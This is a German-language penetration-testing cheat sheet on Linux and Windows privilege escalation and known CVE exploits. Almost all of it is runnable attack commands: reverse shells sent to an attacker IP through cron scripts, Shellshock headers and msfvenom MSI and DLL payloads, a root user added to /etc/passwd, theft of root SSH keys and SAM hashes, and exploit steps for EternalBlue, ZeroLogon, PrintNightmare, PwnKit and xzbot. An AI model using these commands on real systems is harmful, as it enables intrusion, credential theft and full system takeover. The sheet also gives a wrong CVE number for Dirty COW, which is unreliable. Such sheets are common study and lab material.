# Privilege Escalation

---

## Schritt 1 – LinPEAS / WinPEAS herunterladen

```bash
# Kali – herunterladen
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# HTTP Server starten
python3 -m http.server 80
```

### Auf Linux-Opfer übertragen und starten

```bash
wget http://<attacker-ip>/linpeas.sh -O /tmp/linpeas.sh
curl http://<attacker-ip>/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/out.txt
```

### Auf Windows-Opfer übertragen und starten

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>/winPEASx64.exe" -OutFile "C:\Temp\winpeas.exe"
certutil.exe -urlcache -split -f "http://<attacker-ip>/winPEASx64.exe" C:\Temp\winpeas.exe
C:\Temp\winpeas.exe
```

---

## Schritt 2 – Was in LinPEAS / WinPEAS beachten?

**LinPEAS – rot/gelb markierte Abschnitte:**
```
[!] SUID/GUID Binaries          → direkte Privesc möglich
[!] Sudo -l                     → erlaubte Befehle als root
[!] Cron Jobs                   → automatische Scripts als root
[!] Writable /etc/passwd        → eigenen root User eintragen
[!] Writable service files      → Service-Binary ersetzen
[!] SSH Keys                    → private Keys anderer User
[!] Passwords in config files   → Klartext-Passwörter
[!] Network services            → interne Ports (Pivoting)
[!] Kernel Version              → auf Kernel-Exploits prüfen
```

**WinPEAS – wichtige Abschnitte:**
```
[!] AlwaysInstallElevated       → MSI als SYSTEM ausführbar
[!] Unquoted Service Paths      → Pfad-Hijacking möglich
[!] Modifiable Services         → Service-Binary ersetzen
[!] Stored Credentials          → gespeicherte Passwörter
[!] Scheduled Tasks             → Tasks die als SYSTEM laufen
[!] Registry AutoRuns           → Programme bei Systemstart
[!] DLL Hijacking               → fehlende DLLs
```

---

## Linux Privilege Escalation

### SUID Binaries

```bash
# SUID finden
find / -user root -perm -4000 -print 2>/dev/null
find / -perm +6000 2>/dev/null | grep "/bin"     # SUID + SGID (veraltet: /mode)

# GTFOBins prüfen: https://gtfobins.github.io/
```

**SUID Exploits – häufige Beispiele:**

```bash
# PHP (SUID gesetzt)
php -r "pcntl_exec('/bin/sh', ['-p']);"
# -p : behält erhöhte Rechte (EUID)

# Vi / Vim (SUID gesetzt)
vi
:!/bin/sh -p
# oder
:set shell=/bin/sh shellcmdflag=-p
:shell

# Nmap interaktiv (alte Versionen < 5.20, SUID gesetzt)
nmap --interactive
nmap> !sh

# find (SUID oder sudo)
find . -exec /bin/sh -p \; -quit

# tar (SUID oder sudo)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### Sudo Misuse

```bash
# Was darf der User als sudo?
sudo -l

# Beispiele:
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo perl -e 'exec "/bin/bash"'
sudo less /etc/passwd → innerhalb less: !/bin/sh
sudo vim -c ':!/bin/sh'

# GTFOBins für gefundenes Binary prüfen!
```

### Cron Jobs

```bash
crontab -l                    # Crons des aktuellen Users
cat /etc/crontab              # System-weite Crons
ls -la /etc/cron*             # alle Cron-Verzeichnisse

# Script das als root läuft + beschreibbar → eigenen Code einfügen:
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /pfad/zum/cron-script.sh
```

### /etc/passwd beschreibbar

```bash
# Prüfen
ls -l /etc/passwd             # -rwxrwxrwx → beschreibbar!

# MD5-Passwort generieren
mkpasswd --method=md5 --salt=vb1tLY1l PASSWORD

# Eigenen root-User eintragen
echo 'eviluser:$1$vb1tLY1l$If2W7VheNl4T1y7DZJPnQ/:0:0::/root:/bin/bash' >> /etc/passwd
su eviluser
```

### SSH Key von root stehlen

```bash
cat /root/.ssh/id_rsa           # Key lesen (nur wenn Rechte erlauben)
# Key auf Kali kopieren, dann:
chmod 600 id_rsa
ssh -i id_rsa root@<ip>         # direkt als root einloggen
```

---

## Windows Privilege Escalation

### AlwaysInstallElevated

```cmd
# Prüfen (beide müssen 1 sein → vulnerable)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# MSI Payload erstellen (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f msi -o shell.msi

# Auf Opfer ausführen → läuft als SYSTEM
msiexec /quiet /qn /i shell.msi
```

### Unquoted Service Path

```cmd
# Vulnerable Services finden
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

# Beispiel vulnerable Pfad:
# C:\Program Files\My Service\service.exe
# Windows sucht: C:\Program.exe → C:\Program Files\My.exe → ...
# Eigene .exe an der richtigen Stelle ablegen → bei Service-Start ausgeführt
```

### iphlpsvc – Service-Konfiguration

```cmd
sc qc iphlpsvc
# Zeigt: BINARY_PATH_NAME, START_TYPE, DEPENDENCIES
# START_TYPE: AUTO_START → läuft automatisch als SYSTEM
# Prüfen: unquoted Pfad? Beschreibbares Binary?

sc stop iphlpsvc
sc start iphlpsvc   # nach Manipulation des Binaries
```

### Task Scheduler

```cmd
schtasks /query /fo LIST /v
# Auf folgendes achten:
# → Run As User: SYSTEM
# → Task To Run: Pfad eines Scripts (beschreibbar?)
# → Schedule: wann wird ausgeführt
# Beschreibbares Script → eigenen Code einfügen
```

### Hive Nightmare – CVE-2021-36934

```cmd
# Prüfen (SAM lesbar für normale User)
icacls C:\Windows\System32\config\SAM
# Wenn "BUILTIN\Users:(I)(RX)" → vulnerable!

# Hashes aus Shadow Copy extrahieren
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security

# Auf Kali – Hashes dumpen
impacket-secretsdump -sam sam -system system -security security LOCAL
```

---

## Bekannte Exploits / CVEs

### MS08-067 – Windows XP / Server 2003

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOST <ip>
set LHOST <attacker-ip>
run
# → direkt SYSTEM Shell auf ungepatchtem XP/Server 2003
```

### MS17-010 – EternalBlue (Windows 7 / Server 2008)

```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <ip>
set LHOST <attacker-ip>
run

# Manuell – GitHub
# https://github.com/3ndG4me/AutoBlue-MS17-010
python eternal_checker.py <ip>     # prüfen
python zzz_exploit.py <ip>         # exploiten
```

### PrintNightmare – CVE-2021-34527 (alle Windows)

```bash
# Prüfen ob Print Spooler läuft
sc query spooler

# DLL Payload (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f dll -o shell.dll

# SMB Server starten
impacket-smbserver share . -smb2support

# Exploit
git clone https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<ip> '\\<attacker-ip>\share\shell.dll'

# Metasploit
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS <ip>
set SMBUSER <user>
set SMBPASS <pass>
run
```

### ZeroLogon – CVE-2020-1472 (Domain Controller)

```bash
# Prüfen
git clone https://github.com/SecuraBV/CVE-2020-1472
python3 zerologon_tester.py <dc-name> <dc-ip>

# Exploit
git clone https://github.com/dirkjanm/CVE-2020-1472
python3 cve-2020-1472-exploit.py <dc-name> <dc-ip>
# → DC-Passwort auf leer gesetzt

# Hashes dumpen
impacket-secretsdump -just-dc -no-pass <domain>/<dc-name>\$@<dc-ip>

# Domain Admin Zugriff
evil-winrm -i <ip> -u Administrator -H <hash>
```

### BlueKeep – CVE-2019-0708 (RDP, Windows XP/7)

```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <ip>
run

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <ip>
set LHOST <attacker-ip>
run
```

### Dirty COW – CVE-2016-5696 (Linux Kernel ≤ 4.8)

```bash
uname -a    # Kernel Version prüfen

git clone https://github.com/dirtycow/dirtycow.github.io
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <neues-passwort>
su firefart     # neuer root User

# Variante 2: SUID Shell
gcc -pthread cowroot.c -o cowroot
./cowroot
```

### DirtyPipe – CVE-2022-0847 (Linux Kernel 5.8–5.16)

```bash
uname -r    # Kernel Version prüfen

git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
gcc exploit-1.c -o exploit1
./exploit1    # überschreibt /etc/passwd → root Shell

# Variante 2: SUID Binary überschreiben
./exploit-2 /usr/bin/sudo
sudo          # → root
```

### PwnKit – CVE-2021-4034 (pkexec, fast alle Linux)

```bash
pkexec --version    # prüfen

git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034     # → sofort root Shell
```

### Baron Samedit – CVE-2021-3156 (sudo < 1.9.5p2)

```bash
sudo --version    # prüfen

git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 0    # 0 = Ziel-OS auswählen (zeigt Liste)
```

### Sudo Bypass – CVE-2019-14287 (sudo < 1.8.28)

```bash
# Wenn sudo config enthält: (ALL, !root) /bin/bash
sudo -l     # prüfen

# User-ID -1 wird als 0 (root) interpretiert
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash    # Alternative
```

### Shellshock – CVE-2014-6271 (Bash CGI)

```bash
# Prüfen
env x='() { :;}; echo vulnerable' bash -c "echo test"

# HTTP CGI Exploit
curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" \
     http://<ip>/cgi-bin/test.cgi

# Auch anfällig: Referer, Cookie, Host Header
```

### Log4Shell – CVE-2021-44228 (Log4j)

```bash
# Payload in Eingabefelder / Header:
${jndi:ldap://<attacker-ip>:1389/exploit}

# Scanner
git clone https://github.com/fullhunt/log4j-scan
python3 log4j-scan.py -u http://<ip>

# JNDI Exploit Server
java -jar JNDIExploit.jar -i <attacker-ip>
```

### Heartbleed – CVE-2014-0160 (OpenSSL)

```bash
nmap -p 443 --script ssl-heartbleed <ip>

git clone https://github.com/sensepost/heartbleed-poc
python heartbleed.py <ip>
python heartbleed.py <ip> -p 443 | strings    # lesbaren Text filtern
```

### Spring4Shell – CVE-2022-22965 (Spring Framework)

```bash
git clone https://github.com/BobTheShoplifter/Spring4Shell-POC
python3 exploit.py --url http://<ip>/
# Webshell unter /tomcatwar.jsp
curl "http://<ip>/tomcatwar.jsp?pwd=thm&cmd=id"
```

### XZ Backdoor – CVE-2024-3094 (xzbot)

```bash
# Betrifft: xz-utils 5.6.0 / 5.6.1 → SSH RCE ohne Auth
xz --version    # 5.6.0 oder 5.6.1 → betroffen

# GitHub PoC (Go implementiert)
# https://github.com/amlweems/xzbot
git clone https://github.com/amlweems/xzbot
cd xzbot
go build .
./xzbot -addr <ip>:22 -cmd "id"
```

---

## CVE Schnellreferenz

| CVE | Name | Ziel | Effekt |
|-----|------|------|--------|
| CVE-2016-5696 | Dirty COW | Linux Kernel ≤ 4.8 | root |
| CVE-2022-0847 | DirtyPipe | Linux Kernel 5.8–5.16 | root |
| CVE-2021-4034 | PwnKit | Linux pkexec | root |
| CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 | root |
| CVE-2019-14287 | Sudo Bypass | sudo < 1.8.28 | root |
| CVE-2021-34527 | PrintNightmare | Windows (alle) | SYSTEM |
| CVE-2021-36934 | Hive Nightmare | Windows 10/11 | Hashes |
| CVE-2020-1472 | ZeroLogon | Windows DC | Domain Admin |
| CVE-2019-0708 | BlueKeep | Windows XP/7 RDP | SYSTEM |
| CVE-2017-0144 | EternalBlue | Windows 7/2008 SMB | SYSTEM |
| CVE-2008-4250 | MS08-067 | Windows XP SMB | SYSTEM |
| CVE-2014-6271 | Shellshock | Bash CGI | RCE |
| CVE-2021-44228 | Log4Shell | Log4j Java | RCE |
| CVE-2014-0160 | Heartbleed | OpenSSL | Datenleck |
| CVE-2022-22965 | Spring4Shell | Spring Framework | RCE |
| CVE-2024-3094 | XZ Backdoor | xz-utils 5.6.x | SSH RCE |

---

## Windows PrivEsc Ressource

https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook

## GTFOBins

https://gtfobins.github.io/

## LOLBAS

https://lolbas-project.github.io/
